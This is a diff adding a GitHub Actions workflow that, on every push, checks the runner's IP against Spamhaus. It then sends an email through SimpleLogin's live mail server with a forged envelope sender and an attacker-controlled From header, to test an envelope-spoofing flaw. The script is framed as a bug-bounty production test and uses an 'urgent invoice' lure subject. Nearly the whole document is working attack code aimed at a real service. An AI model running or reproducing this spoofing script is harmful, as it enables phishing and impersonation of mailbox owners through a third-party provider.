@@ -1,0 +1,54 @@
+name: smtp-test
+on: [push, workflow_dispatch]
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - name: egress info
+        run: |
+          IP=$(curl -s ifconfig.me)
+          echo "EGRESS_IP=$IP"
+          echo "IP=$IP" >> "$GITHUB_ENV"
+
+      - name: spamhaus check
+        run: |
+          REV=$(echo "$IP" | awk -F. '{print $4"."$3"."$2"."$1}')
+          echo "checking $REV.zen.spamhaus.org"
+          if getent hosts "$REV.zen.spamhaus.org"; then
+            echo "RESULT=LISTED" >> "$GITHUB_ENV"
+          else
+            echo "RESULT=CLEAN" >> "$GITHUB_ENV"
+          fi
+
+      - name: smtp spoof send
+        run: |
+          python3 - <<'PYEOF'
+          import smtplib
+          from email.message import EmailMessage
+
+          MX = "mx1.simplelogin.co"
+          MAIL_FROM = "dave@n9records.com"
+          RCPT_TO = "sl-spoof-friend_at_mailinator_com_rxvlphjm@simplelogin.co"
+
+          msg = EmailMessage()
+          msg["From"] = "Attacker <attacker@attacker-domain.com>"
+          msg["To"] = RCPT_TO
+          msg["Subject"] = "Bounty reply-phase production test - urgent invoice"
+          msg["Date"] = "Sun, 01 Nov 2026 20:30:00 +0000"
+          msg.set_content(
+              "Reply-phase envelope spoofing production test.\n"
+              "Envelope sender is the account mailbox dave@n9records.com; "
+              "the From header is an attacker-controlled domain.\n"
+              "If this message reaches the contact DKIM-signed as the alias, "
+              "the production spoof is confirmed.\n"
+          )
+
+          with smtplib.SMTP(MX, 25, timeout=60) as s:
+              s.set_debuglevel(1)
+              code, resp = s.ehlo("attacker.example")
+              print(f"EHLO -> {code} {resp}")
+              s.sendmail(MAIL_FROM, [RCPT_TO], msg.as_bytes())
+              print("SEND ACCEPTED (250)")
+
+          print("SPOOF-SEND-OK")
+          PYEOF
